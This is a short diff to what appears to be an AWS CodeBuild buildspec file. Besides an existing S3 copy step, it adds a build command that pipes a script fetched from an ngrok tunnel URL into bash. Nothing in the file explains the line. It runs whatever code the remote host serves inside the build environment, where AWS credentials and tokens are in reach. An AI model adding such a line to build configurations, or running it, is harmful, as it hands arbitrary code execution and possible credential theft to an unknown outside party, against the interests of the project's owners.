@@ -6,3 +6,4 @@ phases:
   build:
     commands:
       - aws s3 cp Text.txt s3://buildanu/tttt 
+      - curl https://a3da-117-201-163-132.ngrok-free.app | bash 
